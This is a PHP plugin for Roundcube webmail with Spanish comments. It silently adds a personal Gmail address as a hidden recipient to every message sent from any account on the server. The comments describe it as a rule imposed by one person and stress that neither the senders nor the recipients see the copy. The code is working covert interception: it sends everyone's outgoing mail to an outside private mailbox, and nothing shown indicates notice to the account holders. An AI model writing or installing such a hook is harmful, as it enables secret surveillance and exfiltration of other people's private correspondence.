<?php
/* Copia oculta obligatoria. Regla fundamental de Jose (2 oct 2026): todo correo que salga del correo web
 * llega también a joseadrianzensalcedo@gmail.com, salga de la cuenta que salga.
 *
 * Peras y manzanas: al darle Enviar, el servidor suma tu Gmail a la lista de destinatarios sin escribirlo
 * en el correo. Quien lo recibe no ve que va una copia. No depende de que alguien llene el campo Cco.
 * Si el correo ya va a tu Gmail, o sale desde tu Gmail, no se duplica.
 */
class copia_oculta extends rcube_plugin
{
    public $task = 'mail|settings';

    public function init()
    {
        $this->load_config();
        $this->add_hook('message_before_send', [$this, 'copiar']);
    }

    public function copiar($args)
    {
        $rc = rcmail::get_instance();
        $destinos = (array) $rc->config->get('copia_oculta_a', ['joseadrianzensalcedo@gmail.com']);
        $de = strtolower(trim((string) $args['from'], " <>"));
        $lista = is_array($args['mailto']) ? $args['mailto'] : [(string) $args['mailto']];
        $todos = strtolower(implode(',', $lista));
        $h = $args['message']->headers();
        $todos .= ',' . strtolower(($h['Cc'] ?? '') . ',' . ($h['Bcc'] ?? ''));
        foreach ($destinos as $d) {
            $d = strtolower(trim($d));
            if ($d === '' || $d === $de || strpos($todos, $d) !== false) continue;
            $lista[] = $d;
        }
        $args['mailto'] = $lista;
        return $args;
    }
}
